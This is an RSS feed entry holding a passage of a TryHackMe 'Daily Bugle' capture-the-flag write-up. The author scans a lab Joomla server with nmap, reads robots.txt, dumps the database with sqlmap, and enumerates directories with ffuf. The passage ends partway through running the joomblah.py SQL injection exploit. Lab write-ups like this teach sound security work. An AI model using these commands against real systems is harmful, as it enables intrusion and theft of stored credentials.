@@ -1,0 +1,393 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Joomla on 0000FF</title><link>https://simonefelici.github.io/tags/joomla/</link><description>Recent content in Joomla on 0000FF</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 01 Jan 2024 10:00:00 +0100</lastBuildDate><atom:link href="https://simonefelici.github.io/tags/joomla/index.xml" rel="self" type="application/rss+xml"/><item><title>DailyBugle Writeup THM</title><link>https://simonefelici.github.io/p/dailybugle-writeup-thm/</link><pubDate>Mon, 01 Jan 2024 10:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/dailybugle-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/DailyBugle-writeup-THM/main/99236161-baab-4e1e-8659-b58dbee818de_Export-bd191e58-92d7-4a75-b58b-142788c8928f/Daily%20Bugle%20f7664d233b7c4054a261e00462332c48/Untitled.png" alt="Featured image of post DailyBugle Writeup THM" />&lt;p>The first thing that we are going to do is a nmap scan:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -A 10.10.62.253
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2023-12-30 10:48 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.62.253
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.063s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">997&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 7.4 &lt;span class="o">(&lt;/span>protocol 2.0&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.6 &lt;span class="o">((&lt;/span>CentOS&lt;span class="o">)&lt;/span> PHP/5.6.40&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-generator: Joomla! - Open Source Content Management
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> http-robots.txt: &lt;span class="m">15&lt;/span> disallowed entries
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> /joomla/administrator/ /administrator/ /bin/ /cache/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> /cli/ /components/ /includes/ /installation/ /language/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.6 &lt;span class="o">(&lt;/span>CentOS&lt;span class="o">)&lt;/span> PHP/5.6.40
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3306/tcp open mysql MariaDB &lt;span class="o">(&lt;/span>unauthorized&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No exact OS matches &lt;span class="k">for&lt;/span> host &lt;span class="o">(&lt;/span>If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This is our output, we see that there are 3 ports open,&lt;/p>
+&lt;ul>
+&lt;li>ssh(useless for now)&lt;/li>
+&lt;li>http&lt;/li>
+&lt;li>3306, which is used by MariaDB&lt;/li>
+&lt;/ul>
+&lt;p>The first thing that I am going to do is exploring the web page&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/DailyBugle-writeup-THM/main/99236161-baab-4e1e-8659-b58dbee818de_Export-bd191e58-92d7-4a75-b58b-142788c8928f/Daily%20Bugle%20f7664d233b7c4054a261e00462332c48/Untitled.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>After trying some thing, I cam accross the robots.txt directory:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># If the Joomla site is installed within a folder&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># eg www.example.com/joomla/ then the robots.txt file&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># MUST be moved to the site root&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># eg www.example.com/robots.txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># AND the joomla folder name MUST be prefixed to all of the&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># paths.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># eg the Disallow rule for the /administrator/ folder MUST&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># be changed to read&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Disallow: /joomla/administrator/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># For more information about the robots.txt standard, see:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># http://www.robotstxt.org/orig.html&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># For syntax checking, see:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># http://tool.motoricerca.info/robots-checker.phtml&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User-agent: *
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /administrator/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /bin/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /cache/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /cli/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /components/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /includes/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /installation/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /language/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /layouts/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /libraries/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /logs/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /modules/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /plugins/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /tmp/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This is the output.&lt;/p>
+&lt;p>For now I am going to ignore it.&lt;/p>
+&lt;p>Now I just started sqlmap with the request that I captured from the login form:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">└─$ sqlmap -r Desktop/response.txt --dbms&lt;span class="o">=&lt;/span>mariadb --dump --threads&lt;span class="o">=&lt;/span>&lt;span class="m">5&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And then I ran ffuf for directory enumeration:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.62.253/FUZZ -w /usr/share/wordlists/dirb/big.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.62.253/FUZZ
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htpasswd &lt;span class="o">[&lt;/span>Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 5237ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htaccess &lt;span class="o">[&lt;/span>Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 5361ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">administrator &lt;span class="o">[&lt;/span>Status: 301, Size: 242, Words: 14, Lines: 8, Duration: 80ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin &lt;span class="o">[&lt;/span>Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 79ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cache &lt;span class="o">[&lt;/span>Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 80ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cgi-bin/ &lt;span class="o">[&lt;/span>Status: 403, Size: 210, Words: 15, Lines: 9, Duration: 80ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cli &lt;span class="o">[&lt;/span>Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 82ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">components &lt;span class="o">[&lt;/span>Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 94ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">images &lt;span class="o">[&lt;/span>Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 76ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">includes &lt;span class="o">[&lt;/span>Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 79ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">language &lt;span class="o">[&lt;/span>Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 80ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">layouts &lt;span class="o">[&lt;/span>Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 80ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">libraries &lt;span class="o">[&lt;/span>Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 77ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">media &lt;span class="o">[&lt;/span>Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 79ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">modules &lt;span class="o">[&lt;/span>Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 80ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">plugins &lt;span class="o">[&lt;/span>Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 79ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">robots.txt &lt;span class="o">[&lt;/span>Status: 200, Size: 836, Words: 88, Lines: 33, Duration: 80ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">templates &lt;span class="o">[&lt;/span>Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 71ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tmp &lt;span class="o">[&lt;/span>Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 80ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:: Progress: &lt;span class="o">[&lt;/span>20469/20469&lt;span class="o">]&lt;/span> :: Job &lt;span class="o">[&lt;/span>1/1&lt;span class="o">]&lt;/span> :: &lt;span class="m">265&lt;/span> req/sec :: Duration: &lt;span class="o">[&lt;/span>0:00:51&lt;span class="o">]&lt;/span> :: Errors: &lt;span class="m">0&lt;/span> ::
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Ok, now that I have more informations, I can visit the administrator page:&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/DailyBugle-writeup-THM/main/99236161-baab-4e1e-8659-b58dbee818de_Export-bd191e58-92d7-4a75-b58b-142788c8928f/Daily%20Bugle%20f7664d233b7c4054a261e00462332c48/Untitled%201.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>Nice, we have the jomla login panel.&lt;/p>
+&lt;p>Now we can run OWASP joomscan, and find the version.&lt;/p>
+&lt;p>After that I searched for an exploit, and found this python script:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 joomblah.py http://10.10.62.253
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .---. .-&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;-. .-&amp;#39;&amp;#39;&amp;#39;&lt;/span>-.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="s1">&amp;#39; _ \ &amp;#39;&lt;/span> _ &lt;span class="se">\ &lt;/span> .---.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;---&amp;#39;&lt;/span> / /&lt;span class="sb">`&lt;/span> &lt;span class="s1">&amp;#39;. \ / /` &amp;#39;&lt;/span>. &lt;span class="se">\ &lt;/span> __ __ ___ /&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .---.. &lt;span class="p">|&lt;/span> &lt;span class="se">\ &lt;/span> &lt;span class="s1">&amp;#39; . | \ &amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>/ &lt;span class="sb">`&lt;/span>.&lt;span class="s1">&amp;#39; `. || | | .&amp;#39;&lt;/span>&lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="s1">&amp;#39; | &amp;#39;&lt;/span>&lt;span class="p">|&lt;/span> &lt;span class="s1">&amp;#39; | &amp;#39;&lt;/span>&lt;span class="p">|&lt;/span> .-. .-. &lt;span class="s1">&amp;#39;|| | | &amp;lt; |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | |\ \ / / \ \ / / | | | | | ||| __ | | __ | |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | | `. ` ..&amp;#39;&lt;/span> / &lt;span class="sb">`&lt;/span>. &lt;span class="sb">`&lt;/span> ..&lt;span class="s1">&amp;#39; / | | | | | |||/&amp;#39;&lt;/span>__ &lt;span class="s1">&amp;#39;. | | .:--.&amp;#39;&lt;/span>. &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> .&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;-.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | | &amp;#39;&lt;/span>-...-&lt;span class="s1">&amp;#39;` &amp;#39;&lt;/span>-...-&lt;span class="s1">&amp;#39;` | | | | | ||:/` &amp;#39;&lt;/span>. &lt;span class="s1">&amp;#39;| |/ | \ | | |/.&amp;#39;&amp;#39;&amp;#39;&lt;/span>. &lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">||&lt;/span>&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="p">|&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="s2">&amp;#34; __ | | | / | |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> | | |__| |__| |__|||\ / &amp;#39;| | .&amp;#39;.&amp;#39;&amp;#39;| | | | | |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> __.&amp;#39; &amp;#39; |/&amp;#39;..&amp;#39; / &amp;#39;---&amp;#39;/ / | |_| | | |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| &amp;#39; &amp;#39; `&amp;#39;-&amp;#39;` \ \._,\ &amp;#39;/| &amp;#39;. | &amp;#39;.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">|____.&amp;#39; `--&amp;#39; `&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;---&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;---&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Fetching CSRF token
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Testing SQLi
